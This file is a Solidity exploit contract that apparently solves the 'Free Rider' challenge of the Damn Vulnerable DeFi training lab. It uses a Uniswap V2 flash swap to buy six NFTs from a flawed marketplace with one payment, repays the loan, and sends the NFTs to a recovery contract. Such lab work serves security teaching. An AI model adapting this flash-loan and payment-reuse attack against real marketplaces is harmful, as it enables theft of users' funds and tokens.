//SPDX-License-Identifier:MIT

pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "solmate/src/tokens/WETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";

contract FreeRiderAttack is IUniswapV2Callee, IERC721Receiver {
    IUniswapV2Pair public uPair;
    WETH public wEth;
    FreeRiderNFTMarketplace public nftExchange;
    FreeRiderRecovery public recovery;
    DamnValuableNFT public nft;

    address public player;
    uint256 public amount = 15 ether;
    uint256[] public tokens = [0, 1, 2, 3, 4, 5];

    constructor(
        address _uPair,
        address payable _wEth,
        address payable _nftExchange,
        address _recovery,
        address _nft,
        address _player
    ) payable {
        uPair = IUniswapV2Pair(_uPair);
        wEth = WETH(_wEth);
        nftExchange = FreeRiderNFTMarketplace(_nftExchange);
        recovery = FreeRiderRecovery(_recovery);
        nft = DamnValuableNFT(_nft);
        player = _player;
    }

    function flashSwap() public {
        //flashSwap from UniswapV2Pair
        bytes memory data = abi.encode(amount);
        uPair.swap(amount, uint256(0), address(this), data);
    }

    //swap WETH for ETH (Because 15 ETH is needed to inititate attack)
    function uniswapV2Call(
        address,
        uint256 amount0,
        uint,
        bytes calldata
    ) external {
        wEth.withdraw(amount0);
        nftExchange.buyMany{value: amount0}(tokens);
        uint256 amount0Adjusted = (amount0 * 103) / 100; // To increase the original amount0 by 3% (103/100) as a fee or adjustment.
        wEth.deposit{value: amount0Adjusted}();
        wEth.transfer(msg.sender, amount0Adjusted);
    }

    function transferNft(uint256 id) public {
        bytes memory data = abi.encode(player);
        nft.safeTransferFrom(address(this), address(recovery), id, data);
    }

    // Implementing the 'onERC721Received' interface from the 'IERC721Receiver' contract.
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        // fun selectors only considers first 4bytes.
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}

// This fun 'onERC721Received' returns the four-byte function selector of the onERC721Received function from the IERC721Receiver interface.
// The selector is a unique identifier for a function and consists of the first four bytes of the function's keccak256 hash.
// By returning this selector, the contract signals that it supports the onERC721Received function and can receive ERC721 tokens.

// By returning the function selector in this implementation, the contract indicates that it can handle ERC721 token transfers.
// This function is usually used when the contract wants to receive and handle ERC721 tokens in a specific way,
// perform additional checks, or execute certain actions upon receiving the tokens.
